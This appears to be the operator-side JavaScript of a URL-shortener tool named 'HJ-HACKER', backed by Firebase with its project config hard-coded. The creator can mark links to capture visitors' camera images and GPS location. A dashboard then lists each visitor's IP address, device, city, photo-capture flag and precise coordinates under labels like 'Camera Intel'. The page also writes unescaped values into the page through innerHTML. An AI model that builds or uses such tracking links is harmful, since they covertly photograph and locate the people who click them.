const firebaseConfig = {
    apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
    authDomain: "hjh-tools.firebaseapp.com",
    projectId: "hjh-tools",
    storageBucket: "hjh-tools.firebasestorage.app",
    messagingSenderId: "643137472905",
    appId: "1:643137472905:web:814ca23a86fb084811b958",
    databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

function encodeFirebasePath(str) {
    try {
        return btoa(unescape(encodeURIComponent(str))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
    } catch (e) {
        return str.replace(/\./g, '_');
    }
}

function showToast(title, message, type = 'success') {
    const container = document.getElementById('toastContainer');
    if (!container) return;
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `<i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i><div class="toast-content"><div class="toast-title">${title}</div><div class="toast-message">${message}</div></div>`;
    container.appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
}

function generateShortCode() {
    return Math.random().toString(36).substring(2, 8).toUpperCase();
}

async function shortenUrl() {
    const longUrl = document.getElementById('longUrl').value.trim();
    if (!longUrl) { showToast('Error', 'Enter URL', 'error'); return; }
    
    let urlToShorten = longUrl;
    if (!urlToShorten.startsWith('http')) urlToShorten = 'https://' + urlToShorten;
    
    const customCode = document.getElementById('customCode').value.trim();
    let shortCode = customCode || generateShortCode();
    
    const snapshot = await database.ref(`urls/${shortCode}`).get();
    if (snapshot.exists()) {
        showToast('Error', 'Code taken', 'error');
        return;
    }
    
    const linkData = {
        long_url: urlToShorten,
        created_at: new Date().toISOString(),
        clicks: 0,
        password: document.getElementById('passwordToggle').checked ? document.getElementById('password').value : null,
        social_gate_title: document.getElementById('socialToggle').checked ? document.getElementById('socialTitle').value : null,
        social_gate_url: document.getElementById('socialToggle').checked ? document.getElementById('socialUrl').value : null,
        social_gate_icon: document.getElementById('socialIcon').value,
        capture_camera: document.getElementById('captureCamera').checked,
        capture_location: document.getElementById('captureLocation').checked
    };
    
    await database.ref(`urls/${shortCode}`).set(linkData);
    
    const shortUrl = `${window.location.origin}/${shortCode}`;
    document.getElementById('shortLink').textContent = shortUrl;
    document.getElementById('result').classList.remove('hidden');
    
    // Save to recent
    const recent = JSON.parse(localStorage.getItem('hj_recent_links') || '[]');
    recent.unshift({ code: shortCode, longUrl: urlToShorten, shortUrl: shortUrl, date: new Date().toISOString() });
    localStorage.setItem('hj_recent_links', JSON.stringify(recent.slice(0, 10)));
    
    showToast('Success', 'Link created!', 'success');
    loadRecentLinks();
    
    // Clear form
    document.getElementById('longUrl').value = '';
    document.getElementById('customCode').value = '';
}

// ✅ RECENT LINKS WITH DATA BUTTON
function loadRecentLinks() {
    const recent = JSON.parse(localStorage.getItem('hj_recent_links') || '[]');
    const container = document.getElementById('recentList');
    if (!container) return;
    
    if (recent.length === 0) {
        container.innerHTML = '<div style="text-align: center; padding: 2rem;"><i class="fas fa-inbox"></i><p>No recent links</p></div>';
        return;
    }
    
    container.innerHTML = recent.map(link => `
        <div class="recent-item">
            <div>
                <div class="recent-code"><i class="fas fa-link"></i> /${link.code}</div>
                <div class="recent-url">${link.longUrl.substring(0, 50)}...</div>
                <div style="font-size: 10px; color: #444;">📅 ${new Date(link.date).toLocaleString()}</div>
            </div>
            <div style="display: flex; gap: 8px;">
                <button onclick="copyLink('${link.shortUrl}')" style="padding: 6px 12px; background: #1a1a1a; border: 1px solid #00ff41; border-radius: 8px; color: #00ff41; cursor: pointer;">
                    <i class="fas fa-copy"></i> Copy
                </button>
                <button onclick="viewData('${link.code}')" style="padding: 6px 12px; background: #1a1a1a; border: 1px solid #3b82f6; border-radius: 8px; color: #3b82f6; cursor: pointer;">
                    <i class="fas fa-chart-line"></i> DATA
                </button>
                <button onclick="window.open('${link.shortUrl}', '_blank')" style="padding: 6px 12px; background: #1a1a1a; border: 1px solid #10b981; border-radius: 8px; color: #10b981; cursor: pointer;">
                    <i class="fas fa-external-link-alt"></i> Visit
                </button>
            </div>
        </div>
    `).join('');
}

// ✅ VIEW DATA FUNCTION - Shows captured camera/location data
window.viewData = async (code) => {
    showToast('Loading', `Fetching data for /${code}...`, 'success');
    
    try {
        const analyticsSnapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(50).get();
        const analytics = [];
        analyticsSnapshot.forEach(child => analytics.push({ id: child.key, ...child.val() }));
        analytics.reverse();
        
        const linkSnapshot = await database.ref(`urls/${code}`).get();
        const linkData = linkSnapshot.val();
        
        // Switch to analytics tab
        document.querySelector('[data-tab="analytics"]').click();
        
        const analyticsCodeDiv = document.getElementById('analyticsCode');
        if (analyticsCodeDiv) {
            analyticsCodeDiv.innerHTML = `<div class="card-header"><i class="fas fa-chart-line"></i><h3>📊 DATA for /${code}</h3></div>`;
        }
        
        const totalClicks = analytics.length;
        const uniqueIPs = new Set(analytics.map(a => a.ip_address)).size;
        const cameras = analytics.filter(a => a.captured_image).length;
        const locations = analytics.filter(a => a.latitude).length;
        
        const statsGrid = document.getElementById('statsGrid');
        if (statsGrid) {
            statsGrid.innerHTML = `
                <div class="stat-card"><div class="stat-value">${totalClicks}</div><div class="stat-label">Total Clicks</div></div>
                <div class="stat-card"><div class="stat-value">${uniqueIPs}</div><div class="stat-label">Unique Visitors</div></div>
                <div class="stat-card"><div class="stat-value">${cameras}</div><div class="stat-label">📸 Camera Intel</div></div>
                <div class="stat-card"><div class="stat-value">${locations}</div><div class="stat-label">📍 GPS Tracked</div></div>
            `;
        }
        
        const visitorsList = document.getElementById('visitorsList');
        if (visitorsList) {
            if (analytics.length === 0) {
                visitorsList.innerHTML = '<div style="text-align: center; padding: 2rem;"><i class="fas fa-inbox"></i><p>No visitor data yet. Share your link!</p></div>';
            } else {
                visitorsList.innerHTML = analytics.map(v => `
                    <div class="visitor-item">
                        <div class="visitor-header">
                            <span><i class="fas fa-globe"></i> <strong>${v.ip_address || 'Unknown'}</strong></span>
                            <span><i class="fas fa-clock"></i> ${new Date(v.created_at).toLocaleString()}</span>
                        </div>
                        <div class="visitor-details">
                            <span><i class="fas fa-mobile-alt"></i> ${v.device_type || 'Unknown'}</span>
                            <span><i class="fab fa-chrome"></i> ${v.browser || 'Unknown'}</span>
                            <span><i class="fab fa-windows"></i> ${v.os || 'Unknown'}</span>
                            ${v.city ? `<span><i class="fas fa-location-dot"></i> ${v.city}, ${v.country}</span>` : ''}
                            ${v.captured_image ? `<span style="color: #00ff41;"><i class="fas fa-camera"></i> 📸 PHOTO CAPTURED</span>` : ''}
                            ${v.latitude ? `<span style="color: #00ff41;"><i class="fas fa-map-marker-alt"></i> 🎯 GPS: ${v.latitude.toFixed(4)}, ${v.longitude.toFixed(4)}</span>` : ''}
                        </div>
                    </div>
                `).join('');
            }
        }
        
        document.getElementById('analyticsDetail').classList.remove('hidden');
        showToast('Success', `📊 Loaded ${analytics.length} records!`, 'success');
        
    } catch (error) {
        console.error('Error:', error);
        showToast('Error', 'Failed to load data', 'error');
    }
};

window.copyLink = (text) => {
    navigator.clipboard.writeText(text);
    showToast('Copied', 'Link copied!', 'success');
};

// Tab switching
document.querySelectorAll('.nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const tab = btn.dataset.tab;
        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        document.querySelectorAll('.tab').forEach(t => t.classList.add('hidden'));
        document.getElementById(`${tab}Tab`).classList.remove('hidden');
        if (tab === 'recent') loadRecentLinks();
        if (tab === 'analytics') loadAnalyticsList();
    });
});

// Load analytics list
async function loadAnalyticsList() {
    const domain = window.location.hostname;
    const encodedDomain = encodeFirebasePath(domain);
    const container = document.getElementById('analyticsList');
    if (!container) return;
    
    const snapshot = await database.ref(`domains/${encodedDomain}`).get();
    const links = [];
    snapshot.forEach(child => links.push({ code: child.key, ...child.val() }));
    
    if (links.length === 0) {
        container.innerHTML = '<div style="text-align: center; padding: 2rem;"><i class="fas fa-chart-simple"></i><p>No links found</p></div>';
        return;
    }
    
    container.innerHTML = links.map(link => `
        <div class="recent-item">
            <div><div class="recent-code">/${link.code}</div><div style="font-size: 12px; color: #666;">Clicks: ${link.clicks || 0}</div></div>
            <button onclick="viewData('${link.code}')" style="padding: 8px 16px; background: #3b82f6; border: none; border-radius: 8px; color: white; cursor: pointer;">
                <i class="fas fa-chart-line"></i> View Data
            </button>
        </div>
    `).join('');
}

// Toggle handlers
document.getElementById('passwordToggle')?.addEventListener('change', (e) => {
    document.getElementById('passwordSection').classList.toggle('hidden');
});
document.getElementById('socialToggle')?.addEventListener('change', (e) => {
    document.getElementById('socialSection').classList.toggle('hidden');
});
document.getElementById('advancedToggle')?.addEventListener('click', () => {
    document.getElementById('advancedContent').classList.toggle('hidden');
});
document.getElementById('shortenBtn')?.addEventListener('click', shortenUrl);
document.getElementById('copyBtn')?.addEventListener('click', () => {
    const link = document.getElementById('shortLink')?.textContent;
    if (link) copyLink(link);
});

// Icon selector
document.querySelectorAll('.icon-option').forEach(icon => {
    icon.addEventListener('click', () => {
        document.querySelectorAll('.icon-option').forEach(i => i.classList.remove('active'));
        icon.classList.add('active');
        document.getElementById('socialIcon').value = icon.dataset.icon;
    });
});

loadRecentLinks();
console.log('🔥 HJ-HACKER Ready! DATA button will show visitor info');
